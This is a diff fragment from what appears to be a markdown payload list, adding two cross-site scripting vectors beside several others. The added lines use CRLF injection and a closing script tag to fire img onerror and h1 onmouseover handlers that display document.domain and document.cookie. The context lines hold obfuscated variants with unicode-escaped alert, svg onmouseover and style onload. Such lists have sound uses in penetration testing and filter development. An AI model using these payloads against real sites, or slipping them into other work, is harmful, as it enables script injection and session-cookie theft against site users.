@@ -204,6 +204,8 @@
   <fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`/AmoloHT/`>
   '`&quot;&gt;<svg onmouseover=confirm(document.domain)>
   <p title=" </noscript><style onload=alert(document.domain)//">
+  %0d%0a</script><img+src=x+onerror=alert(document.domain)>
+  %0d%0a</script><h1+onmouseover=alert(document.cookie)>mouseOver</h1>
   ```
 </details>
 
